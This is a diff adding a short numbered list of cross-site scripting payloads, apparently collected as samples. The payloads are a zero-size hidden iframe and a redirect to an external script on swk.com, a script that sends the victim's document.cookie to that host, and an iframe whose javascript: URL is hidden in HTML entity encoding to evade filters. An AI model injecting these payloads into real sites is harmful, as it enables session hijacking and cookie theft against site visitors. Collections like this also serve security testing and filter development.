@@ -1,0 +1,19 @@
+#1
+<iframe src="http://swk.com/script.php?s=b"
+width=0 height=0 frameborder="0"></iframe>
+
+#2
+<script>
+  location.href="http://swk.com/script.php?s=" + "a";
+</script>
+
+#3
+<script>
+  location.href = "http://swk.com/script.php?s="
++ document.cookie;
+</script>
+
+#4
+<IFRAME
+SRC="&#106;&#097;&#118;&#097;&#115;&#099;&#114;&#105;&#112;&#116;&#058;&#097;&#108;&#101;&#114;&#116;&#040;&#039;&#088;&#083;&#083;&#032&#234;&#179;&#181;&#234;&#178;&#169;&#039;&#041;&#059;"
+width="0" height="0" frameborder="0"></IFRAME>
